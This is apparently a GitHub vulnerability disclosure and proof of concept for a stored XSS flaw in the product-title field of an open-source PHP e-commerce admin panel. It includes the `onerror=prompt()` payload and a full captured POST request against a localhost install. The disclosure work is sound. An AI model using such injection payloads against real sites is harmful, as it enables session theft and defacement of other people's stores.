# Full-Ecommece-Website-Add_Product-Stored_XSS-POC
* `Note` => Login to admin
* `Description` => Stored_XSS at `Product Title`
# Step to Reproduct
* `Login to admin` -> `Add Product` -> input payload `<img/src/onerror=prompt(10)>` at `Product Title`
# Exploit
![image](https://user-images.githubusercontent.com/79050415/158090373-2c108b5d-999d-4b23-82dc-1971dd1809fb.png)
* Input payload at `Product Title` -> clicked `Product Title` -> The XSS will trigger
![image](https://user-images.githubusercontent.com/79050415/158090577-8977edc4-12da-47bf-a24f-fcac2113928b.png)
![image](https://user-images.githubusercontent.com/79050415/158090598-0b273971-4fe1-4479-b7c1-95597f40fe83.png)
# Vulnerable Code
![image](https://user-images.githubusercontent.com/79050415/158090702-340cdc74-8abc-4903-99e9-4d7b2d9b6414.png)
![image](https://user-images.githubusercontent.com/79050415/158151529-b0bb3b26-cb0f-43a1-8aab-967cbc71a30b.png)
* When inserting into the database, the input is not filtered out characters
# POC
* Injection Point
```c
------WebKitFormBoundaryXtBAIsNDayF64Ebh
Content-Disposition: form-data; name="product_title"

<image/src/onerror=prompt(8)>
```
* Request
```c
POST /Full-Ecommece-Website/Codes/public/admin/index.php?add_product HTTP/1.1
Host: localhost:8080
Content-Length: 1354971
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXtBAIsNDayF64Ebh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/Full-Ecommece-Website/Codes/public/admin/index.php?add_product
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=oam3rcbi14nilh2pp3s21upev5; twk_uuid_5c2396fb7a79fc1bddf24b28={"uuid":"1.AGDzvqvmbboNUBtyBA0XLKxrviwKWw7HVKOjPqv5aIOJHjOnigPvpa5cn7QPGv6D5QwLM7ZIIBSpua1NrhQBpEeAdolcmuMk3JJtap3Nu2WjBL31HFdBqMF9VFcu8Olw","version":3,"domain":null,"ts":1647022863776}; TawkConnectionTime=0
Connection: close

------WebKitFormBoundaryXtBAIsNDayF64Ebh
Content-Disposition: form-data; name="product_title"

<image/src/onerror=prompt(8)>
------WebKitFormBoundaryXtBAIsNDayF64Ebh
Content-Disposition: form-data; name="product_description"

hacked
------WebKitFormBoundaryXtBAIsNDayF64Ebh
Content-Disposition: form-data; name="product_price"

10000
------WebKitFormBoundaryXtBAIsNDayF64Ebh
Content-Disposition: form-data; name="short_desc"

hacked
------WebKitFormBoundaryXtBAIsNDayF64Ebh
Content-Disposition: form-data; name="publish"

Publish
------WebKitFormBoundaryXtBAIsNDayF64Ebh
Content-Disposition: form-data; name="product_category_id"

12
------WebKitFormBoundaryXtBAIsNDayF64Ebh
Content-Disposition: form-data; name="product_quantity"

1
------WebKitFormBoundaryXtBAIsNDayF64Ebh
Content-Disposition: form-data; name="file"; filename="car.png"
Content-Type: image/png

PNG
```
`VIDEO POC` https://drive.google.com/file/d/155K4qLwGI8kwctd5FijU9gzonSA2rMFz/view?usp=sharing

